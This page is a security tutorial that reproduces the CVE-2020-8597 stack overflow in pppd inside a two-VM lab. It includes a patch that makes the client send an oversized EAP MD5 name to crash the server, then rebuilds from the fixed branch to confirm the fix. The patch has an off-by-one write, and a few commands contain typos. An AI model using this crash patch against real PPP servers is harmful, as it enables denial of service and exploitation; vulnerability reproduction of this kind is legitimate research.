<!DOCTYPE html>
<html>
<head>
<title>0031-buffer-overflow-in-pppd-cve-2020-8597.md</title>
<meta http-equiv="Content-type" content="text/html;charset=UTF-8">

<style>
/* https://github.com/microsoft/vscode/blob/master/extensions/markdown-language-features/media/markdown.css */
/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Microsoft Corporation. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

body {
	font-family: var(--vscode-markdown-font-family, -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif);
	font-size: var(--vscode-markdown-font-size, 14px);
	padding: 0 26px;
	line-height: var(--vscode-markdown-line-height, 22px);
	word-wrap: break-word;
}

#code-csp-warning {
	position: fixed;
	top: 0;
	right: 0;
	color: white;
	margin: 16px;
	text-align: center;
	font-size: 12px;
	font-family: sans-serif;
	background-color:#444444;
	cursor: pointer;
	padding: 6px;
	box-shadow: 1px 1px 1px rgba(0,0,0,.25);
}

#code-csp-warning:hover {
	text-decoration: none;
	background-color:#007acc;
	box-shadow: 2px 2px 2px rgba(0,0,0,.25);
}

body.scrollBeyondLastLine {
	margin-bottom: calc(100vh - 22px);
}

body.showEditorSelection .code-line {
	position: relative;
}

body.showEditorSelection .code-active-line:before,
body.showEditorSelection .code-line:hover:before {
	content: "";
	display: block;
	position: absolute;
	top: 0;
	left: -12px;
	height: 100%;
}

body.showEditorSelection li.code-active-line:before,
body.showEditorSelection li.code-line:hover:before {
	left: -30px;
}

.vscode-light.showEditorSelection .code-active-line:before {
	border-left: 3px solid rgba(0, 0, 0, 0.15);
}

.vscode-light.showEditorSelection .code-line:hover:before {
	border-left: 3px solid rgba(0, 0, 0, 0.40);
}

.vscode-light.showEditorSelection .code-line .code-line:hover:before {
	border-left: none;
}

.vscode-dark.showEditorSelection .code-active-line:before {
	border-left: 3px solid rgba(255, 255, 255, 0.4);
}

.vscode-dark.showEditorSelection .code-line:hover:before {
	border-left: 3px solid rgba(255, 255, 255, 0.60);
}

.vscode-dark.showEditorSelection .code-line .code-line:hover:before {
	border-left: none;
}

.vscode-high-contrast.showEditorSelection .code-active-line:before {
	border-left: 3px solid rgba(255, 160, 0, 0.7);
}

.vscode-high-contrast.showEditorSelection .code-line:hover:before {
	border-left: 3px solid rgba(255, 160, 0, 1);
}

.vscode-high-contrast.showEditorSelection .code-line .code-line:hover:before {
	border-left: none;
}

img {
	max-width: 100%;
	max-height: 100%;
}

a {
	text-decoration: none;
}

a:hover {
	text-decoration: underline;
}

a:focus,
input:focus,
select:focus,
textarea:focus {
	outline: 1px solid -webkit-focus-ring-color;
	outline-offset: -1px;
}

hr {
	border: 0;
	height: 2px;
	border-bottom: 2px solid;
}

h1 {
	padding-bottom: 0.3em;
	line-height: 1.2;
	border-bottom-width: 1px;
	border-bottom-style: solid;
}

h1, h2, h3 {
	font-weight: normal;
}

table {
	border-collapse: collapse;
}

table > thead > tr > th {
	text-align: left;
	border-bottom: 1px solid;
}

table > thead > tr > th,
table > thead > tr > td,
table > tbody > tr > th,
table > tbody > tr > td {
	padding: 5px 10px;
}

table > tbody > tr + tr > td {
	border-top: 1px solid;
}

blockquote {
	margin: 0 7px 0 5px;
	padding: 0 16px 0 10px;
	border-left-width: 5px;
	border-left-style: solid;
}

code {
	font-family: Menlo, Monaco, Consolas, "Droid Sans Mono", "Courier New", monospace, "Droid Sans Fallback";
	font-size: 1em;
	line-height: 1.357em;
}

body.wordWrap pre {
	white-space: pre-wrap;
}

pre:not(.hljs),
pre.hljs code > div {
	padding: 16px;
	border-radius: 3px;
	overflow: auto;
}

pre code {
	color: var(--vscode-editor-foreground);
	tab-size: 4;
}

/** Theming */

.vscode-light pre {
	background-color: rgba(220, 220, 220, 0.4);
}

.vscode-dark pre {
	background-color: rgba(10, 10, 10, 0.4);
}

.vscode-high-contrast pre {
	background-color: rgb(0, 0, 0);
}

.vscode-high-contrast h1 {
	border-color: rgb(0, 0, 0);
}

.vscode-light table > thead > tr > th {
	border-color: rgba(0, 0, 0, 0.69);
}

.vscode-dark table > thead > tr > th {
	border-color: rgba(255, 255, 255, 0.69);
}

.vscode-light h1,
.vscode-light hr,
.vscode-light table > tbody > tr + tr > td {
	border-color: rgba(0, 0, 0, 0.18);
}

.vscode-dark h1,
.vscode-dark hr,
.vscode-dark table > tbody > tr + tr > td {
	border-color: rgba(255, 255, 255, 0.18);
}

</style>

<style>
/* Tomorrow Theme */
/* http://jmblog.github.com/color-themes-for-google-code-highlightjs */
/* Original theme - https://github.com/chriskempson/tomorrow-theme */

/* Tomorrow Comment */
.hljs-comment,
.hljs-quote {
	color: #8e908c;
}

/* Tomorrow Red */
.hljs-variable,
.hljs-template-variable,
.hljs-tag,
.hljs-name,
.hljs-selector-id,
.hljs-selector-class,
.hljs-regexp,
.hljs-deletion {
	color: #c82829;
}

/* Tomorrow Orange */
.hljs-number,
.hljs-built_in,
.hljs-builtin-name,
.hljs-literal,
.hljs-type,
.hljs-params,
.hljs-meta,
.hljs-link {
	color: #f5871f;
}

/* Tomorrow Yellow */
.hljs-attribute {
	color: #eab700;
}

/* Tomorrow Green */
.hljs-string,
.hljs-symbol,
.hljs-bullet,
.hljs-addition {
	color: #718c00;
}

/* Tomorrow Blue */
.hljs-title,
.hljs-section {
	color: #4271ae;
}

/* Tomorrow Purple */
.hljs-keyword,
.hljs-selector-tag {
	color: #8959a8;
}

.hljs {
	display: block;
	overflow-x: auto;
	color: #4d4d4c;
	padding: 0.5em;
}

.hljs-emphasis {
	font-style: italic;
}

.hljs-strong {
	font-weight: bold;
}
</style>

<style>
/*
 * Markdown PDF CSS
 */

 body {
	font-family: -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif, "Meiryo";
	padding: 0 12px;
}

pre {
	background-color: #f8f8f8;
	border: 1px solid #cccccc;
	border-radius: 3px;
	overflow-x: auto;
	white-space: pre-wrap;
	overflow-wrap: break-word;
}

pre:not(.hljs) {
	padding: 23px;
	line-height: 19px;
}

blockquote {
	background: rgba(127, 127, 127, 0.1);
	border-color: rgba(0, 122, 204, 0.5);
}

.emoji {
	height: 1.4em;
}

code {
	font-size: 14px;
	line-height: 19px;
}

/* for inline code */
:not(pre):not(.hljs) > code {
	color: #C9AE75; /* Change the old color so it seems less like an error */
	font-size: inherit;
}

/* Page Break : use <div class="page"/> to insert page break
-------------------------------------------------------- */
.page {
	page-break-after: always;
}

</style>

<script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
</head>
<body>
  <script>
    mermaid.initialize({
      startOnLoad: true,
      theme: document.body.classList.contains('vscode-dark') || document.body.classList.contains('vscode-high-contrast')
          ? 'dark'
          : 'default'
    });
  </script>
<h1 id="cve-2020-8597---buffer-overflow-in-pppd">CVE-2020-8597 - Buffer Overflow in pppd</h1>
<p>Published: March 7th, 2020</p>
<p>In this short tutorial we will go over how to reproduce the crash from CVE-2020-8597.  This is a stack-based buffer overflow in the <code>pppd</code> binary.</p>
<p>We will use our own <code>pppd</code> binary compiled from source, using the latest version: <code>2.4.8</code>.</p>
<p>To accomplish this goal, we will need two Virtual Machines connected by a virtual serial port.  I typically use VirtualBox since it is open source, but the same sort of configuration should work on other hypervisors.</p>
<p>I spun up two VMs:</p>
<ul>
<li><code>pppd-server</code></li>
<li><code>pppd-client</code></li>
</ul>
<p>The serial configuration settings for <code>pppd-server</code> look like this:</p>
<p><img src="https://gist.github.com/nstarke/551433bcc72ff95588e168a0bb666124/raw/8610f404b61c547d85560ccbfba73804af596cb2/0001-server-serial-config.png" alt="Server Serial Configuration" title="Server Serial Configuration"></p>
<p>The serial configuration settings for <code>pppd-client</code> look like this:</p>
<p><img src="https://gist.github.com/nstarke/551433bcc72ff95588e168a0bb666124/raw/8610f404b61c547d85560ccbfba73804af596cb2/0002-client-serial-config.png" alt="Client Serial Configuration" title="Client Serial Configuration"></p>
<p>After configuring the serial settings, spin up and install your choice of Linux Distribution.  I chose <code>Ubuntu 19.10</code>, but any linux distro should work.</p>
<p>Make sure the <code>pppd-server</code> VM is started <strong>before</strong> the <code>pppd-client</code> VM.</p>
<p>Now we need to test the connectivity of the serial connection:</p>
<p><img src="https://gist.github.com/nstarke/551433bcc72ff95588e168a0bb666124/raw/8610f404b61c547d85560ccbfba73804af596cb2/0003-testing-serial-connection.png" alt="Testing Serial Connection" title="Testing Serial Connection"></p>
<p>When installation of the base operating system is completed and testing is successful, we will need a few packages to work with pppd:</p>
<pre class="hljs"><code><div><span class="hljs-comment"># apt install build-essential gdb libssl-dev</span>
</div></code></pre>
<p>Then we proceed to clone the <code>ppp</code> repository:</p>
<pre class="hljs"><code><div>$ git <span class="hljs-built_in">clone</span> https://github.com/paulusmack/ppp.git ~/ppp
</div></code></pre>
<p>Now on the server, we build and install <code>ppp</code>:</p>
<pre class="hljs"><code><div>$ git checkout ppp-2.4.8
$ <span class="hljs-built_in">cd</span> ~/ppp
$ ./configure
$ make
<span class="hljs-comment"># make install</span>
</div></code></pre>
<p>We now have <code>pppd</code> installed for the server.  Next repeat the instructions on <code>pppd-client</code>.</p>
<p>At this point we hae a version of <code>pppd</code> on both systems.  We need to then test the connection.</p>
<p>First, on the server, run the following command:</p>
<pre class="hljs"><code><div><span class="hljs-comment"># pppd /dev/ttyS0 9600 noauth local lock defaultroute debug nodetach 172.16.1.1:172.16.1.2 ms-dns 8.8.8.8</span>
</div></code></pre>
<p>Next, on the client, run the following command:</p>
<pre class="hljs"><code><div><span class="hljs-comment"># pppd noauth local lock defaultroute debug nodetach /dev/ttyS0 9600</span>
</div></code></pre>
<p>Now we should see the connection open up:</p>
<p><img src="https://gist.github.com/nstarke/551433bcc72ff95588e168a0bb666124/raw/8610f404b61c547d85560ccbfba73804af596cb2/0005-initial-connection.png" alt="Initial Connection" title="Initial Connection"></p>
<p>Next we need to implement <code>EAP MD5-Challenge</code>.  We can do so by adjusting the server command and adding a file on the server filesystem.</p>
<p>The file we need to add is <code>/etc/ppp/chap-secrets</code> and should look like this:</p>
<pre class="hljs"><code><div>admin   *       password        *
</div></code></pre>
<p>Where:</p>
<ul>
<li><code>admin</code> is the username</li>
<li>The first * is the server name</li>
<li><code>password</code> is the connection password</li>
<li>The second * is the IP to accept connections from</li>
</ul>
<p>Now we adjust the server command to:</p>
<pre class="hljs"><code><div><span class="hljs-comment"># pppd /dev/ttyS0 9600 auth local lock defaultroute debug nodetach 172.16.1.1:172.16.1.2 ms-dns 8.8.8.8 require-eap</span>
</div></code></pre>
<p>The last thing we need to do is make some changes to the <code>pppd-client</code> pppd binary.  On <code>pppd-client</code>, clean up the ppp project in <code>~/ppp</code>:</p>
<pre class="hljs"><code><div>$ make clean
</div></code></pre>
<p>Then apply the following patch:</p>
<pre class="hljs"><code><div>diff --git a/pppd/eap.c b/pppd/eap.c
index 082e953..0754597 100644
--- a/pppd/eap.c
+++ b/pppd/eap.c
@@ -75,8 +75,7 @@
 #ifndef SHA_DIGESTSIZE
 #define        SHA_DIGESTSIZE 20
 #endif
-
-
+#define PAYLOAD_SIZE 1024
 eap_state eap_states[NUM_PPP];         /* EAP state; one for each unit */
 #ifdef USE_SRP
 static char *pn_secret = NULL;         /* Pseudonym generating secret */
@@ -1392,8 +1391,8 @@ int len;
 #endif /* USE_SRP */
                eap_send_response(esp, id, typenum, esp-&gt;es_client.ea_name,
                    esp-&gt;es_client.ea_namelen);
-               break;
 
+               break;
        case EAPT_NOTIFICATION:
                if (len &gt; 0)
                        info(&quot;EAP: Notification \&quot;%.*q\&quot;&quot;, len, inp);
@@ -1457,8 +1456,12 @@ int len;
                BZERO(secret, sizeof (secret));
                MD5_Update(&amp;mdContext, inp, vallen);
                MD5_Final(hash, &amp;mdContext);
-               eap_chap_response(esp, id, hash, esp-&gt;es_client.ea_name,
-                   esp-&gt;es_client.ea_namelen);
+               char payload[PAYLOAD_SIZE];
+               memset(payload, 'A', PAYLOAD_SIZE - 1);
+               payload[PAYLOAD_SIZE] = '\0';
+               eap_chap_response(esp, id, hash, payload, PAYLOAD_SIZE);
+               //eap_chap_response(esp, id, hash, esp-&gt;es_client.ea_name,
+                //   esp-&gt;es_client.ea_namelen);
                break;
 
 #ifdef USE_SRP
</div></code></pre>
<p>You can apply this patch by saving it as a file like this:</p>
<pre class="hljs"><code><div>$ git apply client-payload.patch
</div></code></pre>
<p>Where <code>client-payload.patch</code> is the file name where we saved the aforementioned patch.</p>
<p>I chose to use the approach of modifying he <code>pppd</code> binary to avoid having to script out the entire <code>LCP</code> handshake process that begins link negotation on <code>ppp</code>.  While it should be possible to craft your own client using <code>scapy</code> and <code>pyserial</code>, it was definitely easier to just modify the existing <code>pppd</code> binary to do what we want.</p>
<p>Now recompile the project:</p>
<pre class="hljs"><code><div>$ ./configure
$ make
<span class="hljs-comment"># make install</span>
</div></code></pre>
<p>Now we adjust the client command to be:</p>
<pre class="hljs"><code><div><span class="hljs-comment"># pppd auth local lock defaultroute debug nodetach /dev/ttyS0 960</span>
</div></code></pre>
<p>Then we run the server command first, and the following client command:</p>
<pre class="hljs"><code><div><span class="hljs-comment"># pppd noauth local lock defaultroute debug nodetach /dev/ttyS0 9600 user notadmin password notpassword</span>
</div></code></pre>
<p>You should see a crash now on the server:</p>
<p><img src="https://gist.github.com/nstarke/551433bcc72ff95588e168a0bb666124/raw/8610f404b61c547d85560ccbfba73804af596cb2/0006-crash.png" alt="Crash" title="Crash"></p>
<p>Now, we want to verify the fix, so back on the server we run:</p>
<pre class="hljs"><code><div>$ make clean
$ git checkout master
$ ./configure
$ make
<span class="hljs-comment"># make install</span>
</div></code></pre>
<p>Then repeat the last server+client commands!  You should not see a crash:</p>
<p><img src="https://gist.github.com/nstarke/551433bcc72ff95588e168a0bb666124/raw/8610f404b61c547d85560ccbfba73804af596cb2/0007-no-crash.png" alt="No Crash" title="No crash"></p>
<p>Sources:</p>
<ul>
<li><a href="https://github.com/paulusmack/ppp/commit/8d7970b8f3db727fe798b65f3377fe6787575426">https://github.com/paulusmack/ppp/commit/8d7970b8f3db727fe798b65f3377fe6787575426</a></li>
<li><a href="https://www.virtualbox.org/wiki/PPP_Tunnel">https://www.virtualbox.org/wiki/PPP_Tunnel</a></li>
</ul>
<p><a href="https://nstarke.github.io/">Back</a></p>

</body>
</html>
